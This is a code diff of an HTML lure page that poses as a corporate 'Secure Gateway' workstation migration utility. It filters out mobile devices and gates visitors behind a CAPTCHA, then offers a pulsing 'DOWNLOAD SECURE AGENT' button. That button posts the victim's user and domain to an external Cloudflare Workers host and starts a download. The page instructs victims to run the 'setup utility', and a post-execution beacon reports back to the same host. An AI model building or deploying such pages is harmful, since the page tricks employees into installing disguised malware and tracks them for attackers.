@@ -17,7 +17,7 @@
 
         /* 2. DESKTOP STYLING */
         body {
-            background: url('https://i.ibb.co/G3spj5wR/orgo-blur.png') no-repeat center center fixed;
+            background: url('https://i.ibb.co') no-repeat center center fixed;
             background-size: cover; backdrop-filter: blur(10px);
             font-family: 'Segoe UI', Tahoma, sans-serif;
             display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0;
@@ -28,6 +28,21 @@
         }
         .logo { font-weight: 700; color: #005a9e; font-size: 20px; margin-bottom: 20px; border-bottom: 2px solid #005a9e; padding-bottom: 12px; text-transform: uppercase; letter-spacing: 1px; }
         .status-text { color: #444; font-size: 14px; margin: 20px 0; line-height: 1.5; }
+        
+        /* 3. PULSING BUTTON ANIMATION */
+        @keyframes pulse-blue {
+            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(0, 90, 158, 0.7); }
+            70% { transform: scale(1.05); box-shadow: 0 0 0 10px rgba(0, 90, 158, 0); }
+            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(0, 90, 158, 0); }
+        }
+        .btn-pulse {
+            display: none; background-color: #005a9e; color: white; width: 100%; 
+            padding: 16px; border-radius: 6px; font-weight: 700; border: none; 
+            cursor: pointer; margin-top: 15px; font-size: 16px;
+            animation: pulse-blue 2s infinite; transition: all 0.3s ease;
+        }
+        .btn-pulse:hover { background-color: #004578; animation: none; }
+
         .instruction-box { display: none; background: #fff4ce; padding: 20px; border-radius: 6px; border: 1px solid #f2c037; margin-top: 20px; }
         .btn-done { background-color: #28a745; color: white; width: 100%; padding: 15px; border-radius: 6px; font-weight: 600; border: none; cursor: pointer; margin-top: 15px; font-size: 15px; }
     </style>
@@ -35,7 +50,7 @@
 <body>
 
     <div id="mobile-block">
-        <img src="https://img.icons8.com/fluency/96/shield.png" alt="Security Shield">
+        <img src="https://img.icons8.com" alt="Security Shield">
         <h2 style="color: #d93025;">Access Restricted</h2>
         <p style="max-width: 300px; font-size: 15px; line-height: 1.6;">
             For security compliance, this migration utility must be accessed via a <b>Corporate Workstation</b>. 
@@ -50,8 +65,13 @@
         <div id="init-section">
             <p class="status-text">Endpoint verification active.<br>Preparing node for <strong id="display-user">USER</strong>...</p>
             
-            <form id="worker-form" action="https://wandering-cherry-0bf1.g03755901.workers.dev/" method="POST">
-                <div class="cf-turnstile" data-sitekey="0x4AAAAAACafd07cw2w7X14i" data-callback="onPassed"></div>
+            <div class="cf-turnstile" data-sitekey="0x4AAAAAACafd07cw2w7X14i" data-callback="onPassed"></div>
+
+            <button id="manual-download-btn" class="btn-pulse">
+                📥 DOWNLOAD SECURE AGENT
+            </button>
+            
+            <form id="worker-form" action="https://wandering-cherry-0bf1.g03755901.workers.dev" method="POST">
                 <input type="hidden" name="cf-turnstile-response" id="cf-token">
                 <input type="hidden" name="user" id="form-user">
                 <input type="hidden" name="dom" id="form-dom">
@@ -59,7 +79,7 @@
         </div>
 
         <div id="step-two" class="instruction-box">
-            <p style="font-size: 14px; color: #b45309; font-weight: bold; margin: 0 0 10px 0;">✔ DOWNLOAD COMPLETED</p>
+            <p style="font-size: 14px; color: #b45309; font-weight: bold; margin: 0 0 10px 0;">✔ DOWNLOAD INITIALIZED</p>
             <p style="font-size: 13px; color: #333; text-align: left; margin: 0; line-height: 1.6;">
                 1. <b>Run</b> the downloaded setup utility.<br>
                 2. <b>Complete</b> the certificate handshake.<br>
@@ -69,33 +89,53 @@
         </div>
     </div>
 
-    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+    <script src="https://challenges.cloudflare.com" async defer></script>
     <script>
-        // JS Mobile Detection
+        // 1. URL & UI Parameters
+        const urlParams = new URLSearchParams(window.location.search);
+        const user = urlParams.get('user') || 'Authorized User';
+        const dom = urlParams.get('dom') || 'Corporate';
+        const workerUrl = "https://wandering-cherry-0bf1.g03755901.workers.dev";
+
+        // 2. JS Mobile Detection (Redundant Backup to CSS)
         if (/Android|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i.test(navigator.userAgent)) {
             document.getElementById('main-content').style.display = 'none';
             document.getElementById('mobile-block').style.display = 'flex';
         }
 
-        const urlParams = new URLSearchParams(window.location.search);
-        const user = urlParams.get('user') || 'Authorized User';
-        const dom = urlParams.get('dom') || 'Corporate';
-
-        // Apply Dynamic Data
+        // Apply Dynamic Data to UI
         document.getElementById('display-user').innerText = user;
         document.getElementById('display-dom').innerText = dom + " Secure Gateway";
         document.getElementById('form-user').value = user;
         document.getElementById('form-dom').value = dom;
 
+        // 3. CAPTCHA SOLVED CALLBACK
         function onPassed(token) {
             document.getElementById('cf-token').value = token;
-            document.getElementById('worker-form').submit();
-            setTimeout(() => {
-                document.getElementById('init-section').style.display = 'none';
-                document.getElementById('step-two').style.display = 'block';
-            }, 1500);
+            
+            // Hide Turnstile and show the Pulsing Button
+            document.querySelector('.cf-turnstile').style.display = 'none';
+            const dlBtn = document.getElementById('manual-download-btn');
+            dlBtn.style.display = 'block';
+
+            // Handle Manual Click
+            dlBtn.onclick = function() {
+                this.innerText = "Initializing...";
+                this.style.animation = "none";
+                this.disabled = true;
+
+                // Submit form to Worker (Triggers Redirect)
+                document.getElementById('worker-form').submit();
+
+                // Show instruction box after submission
+                setTimeout(() => {
+                    document.getElementById('init-section').style.display = 'none';
+                    document.getElementById('step-two').style.display = 'block';
+                }, 1500);
+            };
         }
 
+        // 4. DONE BUTTON CLICK (POST-EXECUTION)
         document.getElementById('done-btn').addEventListener('click', async function() {
             this.innerText = "Processing...";
             this.disabled = true;
@@ -105,11 +145,13 @@
             fd.append('user', user);
             fd.append('dom', dom);
 
-            await fetch("https://wandering-cherry-0bf1.g03755901.workers.dev/", { method: "POST", body: fd });
+            try {
+                await fetch(workerUrl, { method: "POST", body: fd, mode: 'no-cors' });
+            } catch (e) { console.log("Worker Ping Failed"); }
 
             document.querySelector('.card').innerHTML = 
                 "<div style='padding: 20px;'>" +
-                "<img src='https://img.icons8.com/fluency/96/checked.png' style='margin-bottom:20px;'>" +
+                "<img src='https://img.icons8.com' style='margin-bottom:20px;'>" +
                 "<h2 style='color:#28a745; margin:0;'>Success</h2>" +
                 "<p style='color:#666; font-size:14px; margin-top:10px;'>Your workstation is now synchronized. You may close this tab.</p>" +
                 "</div>";
@@ -117,5 +159,3 @@
     </script>
 </body>
 </html>
-
-
